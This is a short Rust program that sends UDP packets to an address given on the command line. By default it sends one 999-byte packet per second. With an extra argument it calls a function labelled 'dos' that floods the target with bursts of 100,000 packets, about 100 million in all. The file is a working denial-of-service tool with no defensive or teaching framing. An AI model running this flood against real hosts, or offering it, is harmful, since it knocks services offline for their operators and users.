use std::env;
use std::net::{UdpSocket, SocketAddr};


fn dos(addr_string: String) -> std::io::Result<()> {

    println!("DOS...");

    let socket = UdpSocket::bind("0.0.0.0:0")?;

    let addr: SocketAddr = addr_string.parse().unwrap();

    let buf = [5; 999];

    for i in 0..1_000 {
        for _ in 0..100_000 {
            socket.send_to(&buf, &addr)?;
        }
        println!("sent pktno={}", i);
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    Ok(())
}


fn main() -> std::io::Result<()> {

    let args: Vec<String> = env::args().collect();

    let addr_string = &args[1];

    if args.len() > 2 {
        dos(addr_string.to_string())?;
        return Ok(());
    }

    println!("Sending...");

    let socket = UdpSocket::bind("0.0.0.0:0")?;

    let addr: SocketAddr = addr_string.parse().unwrap();

    let buf = [5; 999];

    for i in 0..1_000 {
        socket.send_to(&buf, &addr)?;
        std::thread::sleep(std::time::Duration::from_millis(1_000));
        println!("sent pktno={}", i);
    }

    Ok(())
}
